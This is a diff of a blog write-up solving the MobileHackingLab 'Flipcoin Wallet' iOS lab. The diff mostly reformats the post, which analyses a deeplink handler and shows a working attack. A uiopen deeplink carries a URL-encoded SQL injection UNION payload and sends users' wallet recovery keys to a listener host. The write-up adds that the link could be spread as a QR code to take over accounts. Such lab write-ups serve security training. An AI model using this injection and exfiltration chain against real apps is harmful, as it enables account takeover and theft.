@@ -1,8 +1,4 @@
-Title: MobileHackingLab - Flipcoin Wallet
-Slug: mobile/mobilehackinglab/flipcoin-wallet
-Date: 2025-10-21 18:00
-Category: Mobile
-
+# MobileHackingLab - Flipcoin Wallet
 
 This is an iOS mobile challenge from [MobileHackingLabs](https://www.mobilehackinglab.com/course/lab-flipcoin-wallet).
 
@@ -12,31 +8,31 @@ The challenge is centered around a fictitious crypto currency flipcoin and its w
 
 The app presents a crypto balance and some send/receive functionalities as show below:
 
-![[flipcoin-wallet-app-1.jpg]]
+![flipcoin-wallet-app-1](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-app-1.jpg)
 
 ## Static Analysis
 
 The `Info.plist` content has been inspected as follows:
 
-~~~shell
+```shell
 plutil -p Payload/Flipcoin\ Wallet.app/Info.plist | less 
-~~~
+```
 
 This revealed that the application handles deeplinks with protocol `flipcoin://`. The logic of the deeplink is implemented in the class `Flipcoin_Wallet.SceneDelegate`:
 
 
-![[flipcoin-wallet-static-1.png]]
+![flipcoin-wallet-static-1](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-static-1.png)
 
 The application's "Receive" functionality presents the following QR code to be used in order to receive flipcoins:
 
-![[flipcoin-wallet-app-2.jpg]]
+![flipcoin-wallet-app-2](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-app-2.jpg)
 
 The QR code's content corresponds to the following deeplink: `flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0`
 
 This indicates that the previously identified deeplink can be used to send/receive flipcoins. Let's analyze the `SceneDelegate` decompiled code:
 
 
-~~~c
+```c
 void __thiscall
 Flipcoin_Wallet::SceneDelegate::scene(SceneDelegate *this,UIScene *param_1,Set<> openURLContexts)
 
@@ -1355,7 +1351,7 @@ LAB_100016580:
   }
   return;
 }
-~~~
+```
 
 That's quite a long code; summarising, these are the most relevant points:
 
@@ -1364,34 +1360,34 @@ That's quite a long code; summarising, these are the most relevant points:
 
 `amount` and `testnet` parameters:
 
-![[flipcoin-wallet-static-2.png]]
+![flipcoin-wallet-static-2](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-static-2.png)
 
 
 `testnet` default value:
 
-![[flipcoin-wallet-static-3.png]]
+![flipcoin-wallet-static-3](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-static-3.png)
 
 
 Unsafe SQL query construction:
 
-![[flipcoin-wallet-static-4.png]]
+![flipcoin-wallet-static-4](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-static-4.png)
 
 While searching for strings, the following is found in the  `Flipcoin_Wallet::DatabaseHelper`'s `$get_wallets` method:
 
-![[flipcoin-wallet-static-5.png]]
+![flipcoin-wallet-static-5](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-static-5.png)
 
 Therefore, the constructed query is most likely the following: `SELECT * from wallet WHERE amount > [amount param value] AND currency='flipcoin' LIMIT 1`.
 ## Solution
 
 Firstly, I wanted to understand the purpose for the `testnet` parameter, so I've ran the following deeplink, after connecting with SSH to the iPhone device:
 
-~~~shell
+```shell
 uiopen "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0&testnet=http://192.168.1.85:8000"
-~~~
+```
 
 On a previously set up listener, the following data is received:
 
-![[flipcoin-wallet-solution-1.png]]
+![flipcoin-wallet-solution-1](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-solution-1.png)
 
 This parameter therefore seems to be used for testing purposes and can be eventually abused by a threat actor to leak data.
 
@@ -1399,27 +1395,27 @@ Next step has been to understand if a SQL injection was possible. The following 
 
 As shown below, this payload returned some data to the listener; also note that another user data is leaked. This indicates that the SQL injection was successful:
 
-![[flipcoin-wallet-solution-2.png]]
+![flipcoin-wallet-solution-2](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-solution-2.png)
 
 The following counter-proof confirmed it, using the payload `0%20AND%201%3D0--` (`0 AND 1=0--`), which returned no data since the query results into no row being retrieved:
 
-![[flipcoin-wallet-solution-3.png]]
+![flipcoin-wallet-solution-3](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-solution-3.png)
 
 Then, I've used `Fliza` in order to inspect the application data directory, searching for a sqlite database:
 
-![[flipcoin-wallet-app-3.jpg]]
+![flipcoin-wallet-app-3](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-app-3.jpg)
 
 In the `Documents` directory I've found what I was looking for:
 
-![[flipcoin-wallet-app-4.jpg]]
+![flipcoin-wallet-app-4](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-app-4.jpg)
 
 This database contains the table `wallet`:
 
-![[flipcoin-wallet-app-5.jpg]]
+![flipcoin-wallet-app-5](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-app-5.jpg)
 
 Which contains the following data:
 
-![[flipcoin-wallet-app-6.jpg]]
+![flipcoin-wallet-app-6](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-app-6.jpg)
 
 Therefore, `wallet`'s schema is the following:
 
@@ -1431,15 +1427,15 @@ Therefore, `wallet`'s schema is the following:
 
 When running:
 
-~~~shell
+```shell
 uiopen "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0&testnet=http://192.168.1.85:8000"
-~~~
+```
 
 the applications sends to the server a JSON such as:
 
-~~~json
+```json
 {"jsonrpc":"2.0","method":"web3_sha3","params":["0x252B2Fff0d264d946n1004E581bb0a46175DC009", "111120a58098a188ff60e0949d3102e9cc38b61701065c72f8aed205e76f245e"],"id":1}'
-~~~
+```
 
 In the `params` field appears to be present the `address` value. 
 
@@ -1449,10 +1445,10 @@ The following payload will then leak the recovery key of the user by performing 
 
 The payload has then been tested as follows:
 
-~~~shell
+```shell
 uiopen "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0%20AND%201%3D0%20UNION%20SELECT%20id%2Crecovery_key%2Ccurrency%2Camount%2Crecovery_key%20FROM%20wallet%20LIMIT%201%20OFFSET%200--&testnet=http://192.168.1.85:8000"
-~~~
+```
 
-![[flipcoin-wallet-solution-4.png]]
+![flipcoin-wallet-solution-4](../../images/mobile/mobilehackinglab/flipcoin-wallet/flipcoin-wallet-solution-4.png)
 
 A threat actor could, for example, generate a QR code with the previous deeplink, inducting the victim to scan it and taking over its account by mean of the leaked recovery key.
